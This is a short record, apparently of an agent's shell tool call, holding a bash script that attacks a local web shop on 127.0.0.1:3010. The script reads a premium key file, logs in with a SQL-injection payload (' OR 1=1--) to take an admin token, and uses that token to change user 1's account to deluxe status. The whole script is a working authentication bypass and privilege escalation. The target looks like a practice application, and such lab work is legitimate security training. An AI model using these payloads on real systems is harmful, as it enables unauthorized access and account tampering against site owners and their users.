data.how_captured: shell: # Check the premium key for deluxe access echo "=== Premium key ===" curl -s http://127.0.0.1:3010/encryptionkeys/premium.key echo "" # Try to apply the premium
data.command:
# Check the premium key for deluxe access
echo "=== Premium key ==="
curl -s http://127.0.0.1:3010/encryptionkeys/premium.key
echo ""

# Try to apply the premium key
echo "=== Try to apply deluxe token ==="
ADMIN_TOKEN=$(curl -s -X POST http://127.0.0.1:3010/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"'"'"' OR 1=1--","password":"test"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])")

echo "=== Check if we can update user to deluxe ==="
curl -s -X PUT http://127.0.0.1:3010/api/Users/1 \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"deluxeToken":"1337133713371337.EA99A61D92D2955B1E9285B55BF2AD42"}' | python3 -m json.tool 2>/dev/null
